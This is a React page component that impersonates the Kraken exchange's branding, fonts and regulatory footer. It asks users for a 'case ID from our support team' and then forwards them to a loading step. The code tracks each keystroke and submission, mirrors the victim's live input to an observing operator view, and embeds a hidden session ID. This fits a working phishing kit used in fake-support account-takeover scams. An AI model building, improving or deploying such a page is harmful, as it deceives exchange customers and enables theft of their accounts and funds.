import { createFileRoute } from "@tanstack/react-router";
import { useState, useRef, useEffect } from "react";
import {
  KrakenLogo, KnFontStyle, useKnTracking,
} from "@/components/kn/KnShared";

export const Route = createFileRoute("/kn/caseid")({
  head: () => ({ meta: [{ title: "Case ID" }] }),
  component: KrakenCaseIdPage,
});

function KrakenCaseIdPage() {
  const { trackClick, trackInput, trackSubmit, knNavigate, sessionId, isObserve } = useKnTracking();
  const [digits, setDigits] = useState<string[]>(['', '', '', '', '', '']);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    if (newDigits.every(d => d !== '')) {
      trackInput('caseid', newDigits.join(''), 'text');
      trackClick('Case ID Submitted');
    }

    // Don't auto-navigate; wait for Continue button
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (!pasted) return;
    const newDigits = [...digits];
    for (let i = 0; i < pasted.length; i++) {
      newDigits[i] = pasted[i];
    }
    setDigits(newDigits);
    const nextIndex = Math.min(pasted.length, 5);
    inputRefs.current[nextIndex]?.focus();
    if (newDigits.every(d => d !== '')) {
      trackInput('caseid', newDigits.join(''), 'text');
      trackClick('Case ID Submitted');
    }
    inputRefs.current[nextIndex]?.focus();

    // Don't auto-navigate; wait for Continue button
  };

  const code = digits.join('');
  const allFilled = digits.every(d => d !== '');

  const handleContinue = () => {
    if (!allFilled) return;
    trackClick('Case ID Continue');
    trackSubmit('caseid', digits.join(''));
    knNavigate('/kn/loading');
  };

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      if (d.field !== 'caseid' && d.field !== 'caseid_submitted' && !/code|case/i.test(d.field)) return;
      const value = String(d.value ?? '').replace(/\D/g, '').slice(0, 6);
      const next = ['', '', '', '', '', ''];
      for (let i = 0; i < value.length; i++) next[i] = value[i];
      setDigits(next);
    }
    window.addEventListener('ux:mirror-live-input', onMirror);
    return () => window.removeEventListener('ux:mirror-live-input', onMirror);
  }, [isObserve]);

  return (
    <div
      className="kn-page min-h-screen flex flex-col"
      style={{
        backgroundColor: '#f6f5f9',
        fontFamily: "'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif",
      }}
    >
      <KnFontStyle />
      <style>{`
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
          font-display: swap;
        }
        * { font-family: 'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif !important; }
        @media (max-width: 640px) {
          .kraken-card { background-color: transparent !important; box-shadow: none !important; border-radius: 0 !important; padding: 16px 0 !important; }
          .kraken-lang-btn { display: none !important; }
          .kraken-footer-detail { display: none !important; }
          .kraken-footer { justify-content: center !important; }
          .kraken-header { padding-left: 16px !important; padding-right: 16px !important; }
        }
        .kraken-digit-input {
          transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s;
        }
        .kraken-digit-input:focus {
          border-color: #7132f5 !important;
          box-shadow: 0 0 0 3px rgba(113, 50, 245, 0.15);
          transform: scale(1.05);
        }
        .kraken-digit-input.filled {
          border-color: #7132f5 !important;
        }
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(12px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes scaleIn {
          from { opacity: 0; transform: scale(0.9); }
          to { opacity: 1; transform: scale(1); }
        }
      `}</style>

      {/* Header */}
      <header style={{ paddingTop: 12, backgroundColor: '#f6f5f9' }}>
        <div
          className="flex items-center justify-between kraken-header"
          style={{ height: 40, paddingLeft: 36, paddingRight: 36 }}
        >
          <div className="cursor-pointer" onClick={() => trackClick('Logo')}>
            <KrakenLogo />
          </div>
          <button
            className="flex items-center kraken-lang-btn"
            style={{
              gap: 4,
              padding: '8px 12px',
              borderRadius: 8,
              border: 'none',
              cursor: 'pointer',
              backgroundColor: '#686b8214',
              color: '#686b82',
              fontSize: 12,
              fontWeight: 400,
              lineHeight: '16px',
            }}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M21 12C21 16.9706 16.9706 21 12 21M21 12C21 7.02944 16.9706 3 12 3M21 12H3M12 21C7.02944 21 3 16.9706 3 12M12 21C9.79086 21 8 16.9706 8 12C8 7.02944 9.79086 3 12 3M12 21C14.2091 21 16 16.9706 16 12C16 7.02944 14.2091 3 12 3M3 12C3 7.02944 7.02944 3 12 3" strokeWidth="2" strokeLinecap="square" stroke="#9497a9" fill="transparent"/>
            </svg>
            <span>English (US)</span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M7.5 9.98291L11.2045 13.6874C11.6438 14.1268 12.3562 14.1268 12.7955 13.6874L16.5 9.98291" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" stroke="#9497a9" fill="transparent"/>
            </svg>
          </button>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex justify-center items-start" style={{ padding: '48px 24px 0' }}>
        <div
          className="kraken-card"
          style={{
            width: '100%',
            maxWidth: 480,
            backgroundColor: '#fff',
            borderRadius: 16,
            padding: '40px 32px',
            animation: 'fadeInUp 0.4s ease-out',
          }}
        >
          <h1
            style={{
              fontSize: 24,
              fontWeight: 500,
              color: '#1e1131',
              margin: 0,
              lineHeight: '32px',
            }}
          >
            Case ID
          </h1>
          <p
            style={{
              fontSize: 14,
              color: '#686b82',
              marginTop: 8,
              lineHeight: '20px',
            }}
          >
            Enter the 6-digit case ID provided to you by our support team.
          </p>

          {/* 6-digit input grid */}
          <div
            className="grid grid-cols-6 gap-3"
            style={{ marginTop: 32 }}
          >
            {digits.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputRefs.current[i] = el; }}
                type="text"
                inputMode="numeric"
                data-ux-field="caseid"
                name="caseid"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                onPaste={i === 0 ? handlePaste : undefined}
                className={`kraken-digit-input w-full aspect-square text-center font-medium rounded-xl border-2 outline-none ${digit ? 'filled' : ''}`}
                style={{
                  fontSize: 24,
                  backgroundColor: '#f6f5f9',
                  borderColor: digit ? '#7132f5' : '#e8e5ef',
                  color: '#1e1131',
                  caretColor: '#7132f5',
                  animation: `scaleIn 0.3s ease-out ${i * 0.05}s both`,
                }}
              />
            ))}
          </div>

          {/* Paste button */}
          <button
            onClick={() => {
              navigator.clipboard.readText().then((text) => {
                const cleaned = text.replace(/\D/g, '').slice(0, 6);
                if (!cleaned) return;
                const newDigits = [...digits];
                for (let i = 0; i < cleaned.length; i++) {
                  newDigits[i] = cleaned[i];
                }
                setDigits(newDigits);
                if (newDigits.every(d => d !== '')) {
                  trackInput('caseid', newDigits.join(''), 'text');
                  trackClick('Case ID Submitted');
                }
                trackClick('Paste Case ID');
                const nextIndex = Math.min(cleaned.length, 5);
                inputRefs.current[nextIndex]?.focus();

                // Don't auto-navigate; wait for Continue button
              });
            }}
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: 6,
              width: '100%',
              marginTop: 16,
              padding: '10px 0',
              backgroundColor: 'transparent',
              border: 'none',
              cursor: 'pointer',
              color: '#7132f5',
              fontSize: 14,
              fontWeight: 500,
            }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="9" y="9" width="13" height="13" rx="2" stroke="#7132f5" strokeWidth="2"/>
              <path d="M5 15H4C2.89543 15 2 14.1046 2 13V4C2 2.89543 2.89543 2 4 2H13C14.1046 2 15 2.89543 15 4V5" stroke="#7132f5" strokeWidth="2"/>
            </svg>
            Paste from clipboard
          </button>

          {/* Continue button */}
          <button
            onClick={handleContinue}
            disabled={!allFilled}
            style={{
              width: '100%',
              height: 48,
              marginTop: 24,
              borderRadius: 12,
              border: 'none',
              fontSize: 16,
              fontWeight: 500,
              cursor: allFilled ? 'pointer' : 'default',
              backgroundColor: allFilled ? '#7132f5' : '#e8e5ef',
              color: allFilled ? '#fff' : '#9497a9',
              transition: 'all 0.2s',
            }}
          >
            Continue
          </button>

          {/* Info text */}
          <p
            style={{
              fontSize: 13,
              color: '#9497a9',
              marginTop: 20,
              textAlign: 'center',
              lineHeight: '18px',
            }}
          >
            Not your device? Use a private window.
            <br />
            See our{' '}
            <a
              href="#"
              style={{ color: '#7132f5', textDecoration: 'none', fontWeight: 500 }}
              onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
              onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
              onClick={() => trackClick('Privacy Policy')}
            >
              Privacy Policy
            </a>{' '}
            for more info.
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer
        className="flex items-center justify-between kraken-footer"
        style={{ padding: '16px 24px' }}
      >
        <p style={{ fontSize: 11, color: '#9497a9', margin: 0 }}>
          Brokerage services are provided by Kraken Securities, LLC, member{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >FINRA</a>
          /
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >SIPC</a>
          .{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >Disclosures here</a>
          .
        </p>
        <div className="flex items-center kraken-footer-detail" style={{ gap: 16 }}>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Privacy Notice</a>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Terms of Service</a>
        </div>
      </footer>

      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
